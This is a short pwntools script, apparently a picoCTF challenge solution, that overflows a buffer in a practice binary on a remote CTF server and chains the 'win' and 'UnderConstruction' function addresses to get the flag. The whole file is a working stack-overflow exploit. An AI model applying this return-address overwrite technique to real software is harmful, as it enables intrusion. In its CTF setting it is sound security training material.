from pwn import *

# io = process("./vuln")
io = remote("saturn.picoctf.net", 59050)
elf = ELF("./vuln")
rop = ROP(elf)

io.recvuntil("Give me a string that gets you the flag")
rop.raw(b"a" * (10 + 4))
rop.raw(p32(elf.symbols["win"]))
rop.raw(p32(elf.symbols["UnderConstruction"]))
print(rop.dump())

io.sendline(rop.chain())

print(io.recvall())
